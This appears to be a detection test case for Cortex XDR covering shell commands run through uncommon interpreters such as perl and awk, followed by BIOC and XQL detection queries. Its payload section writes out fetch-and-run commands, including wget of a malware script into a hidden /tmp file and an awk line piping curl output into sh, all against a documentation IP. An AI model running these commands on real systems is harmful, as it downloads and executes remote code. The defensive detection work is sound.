identity.name: Linux Shell Command Execution via Uncommon Interpreter

identity.description: An attacker executes a malicious shell command using an uncommon interpreter to avoid detection, which triggers the 'Uncommon Linux shell command execution' alert. Cortex should detect the use of non-standard interpreters like 'awk' or 'perl' for command execution.

payload.code:
wget http://192.0.2.10/malware.sh -O /tmp/.tmp
chmod +x /tmp/.tmp
perl -e 'use LWP::UserAgent; my $ua = LWP::UserAgent->new; $ua->get("http://192.0.2.10/execute");'
awk 'BEGIN { system("curl -s http://192.0.2.10/attack | sh") }'

expected_artifacts.description: Execution of perl interpreter with suspicious command

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Uncommon Shell Command Execution
biocs.description: Detection of shell commands executed via uncommon interpreters like perl or awk
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name in ('perl', 'awk', 'python') and actor_process_image_name = 'bash'
| filter action_command_line contains 'system' or action_command_line contains 'exec'

abiocs.name: Unusual Perl/Awk Command Execution
abiocs.description: Behavioral deviation where shell commands are executed via uncommon interpreters like perl or awk
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name in ('perl', 'awk') and actor_process_image_name = 'bash'
| filter action_command_line contains 'system' or action_command_line contains 'exec'

xql_queries.name: Uncommon Shell Interpreter Usage
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name in ('perl', 'awk', 'python') and actor_process_image_name = 'bash'
| filter action_command_line contains 'system' or action_command_line contains 'exec'
| comp count() by action_process_image_name, action_command_line
